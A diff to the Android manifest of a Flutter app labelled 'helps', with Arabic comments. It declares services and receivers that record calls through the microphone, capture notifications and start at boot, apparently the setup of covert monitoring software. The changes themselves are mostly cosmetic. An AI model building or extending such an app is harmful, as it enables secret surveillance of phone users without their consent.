@@ -1,4 +1,5 @@
-<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.example.installing_package">
 
     <!-- الصلاحيات -->
     <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" tools:ignore="ProtectedPermissions" />
@@ -15,8 +16,8 @@
 
     <application
         android:label="helps"
-        android:name="${applicationName}"
-        android:icon="@mipmap/ic_launcher">
+        android:icon="@mipmap/ic_launcher"
+        android:name="${applicationName}">
 
         <activity
             android:name=".MainActivity"
@@ -27,11 +28,9 @@
             android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode"
             android:hardwareAccelerated="true"
             android:windowSoftInputMode="adjustResize">
-
             <meta-data
                 android:name="io.flutter.embedding.android.NormalTheme"
                 android:resource="@style/NormalTheme" />
-
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -42,10 +41,9 @@
             android:name="flutterEmbedding"
             android:value="2" />
 
-        <!-- خدمات الإشعارات -->
+        <!-- الخدمة التي تسجل الإشعارات -->
         <service
             android:name=".NotificationService"
-            android:label="Notification Listener"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
             android:exported="true">
             <intent-filter>
@@ -53,14 +51,14 @@
             </intent-filter>
         </service>
 
-        <!-- خدمات تسجيل المكالمات -->
+        <!-- تسجيل المكالمات -->
         <service
             android:name=".CallRecordingService"
             android:enabled="true"
             android:exported="true"
             android:foregroundServiceType="microphone" />
 
-        <!-- استقبال المكالمات -->
+        <!-- استقبال حالة المكالمات -->
         <receiver
             android:name=".CallReceiver"
             android:enabled="true"
@@ -70,7 +68,7 @@
             </intent-filter>
         </receiver>
 
-        <!-- استقبال الإشعارات -->
+        <!-- استقبال حدث الإشعارات -->
         <receiver
             android:name=".NotificationReceiver"
             android:enabled="true"
@@ -80,7 +78,7 @@
             </intent-filter>
         </receiver>
 
-        <!-- استقبال حدث إعادة تشغيل الجهاز -->
+        <!-- استقبال إعادة التشغيل -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -92,7 +90,7 @@
 
     </application>
 
-    <!-- مهم: Query للـ Text Processing -->
+    <!-- تعريف صلاحيات Query -->
     <queries>
         <intent>
             <action android:name="android.intent.action.PROCESS_TEXT" />
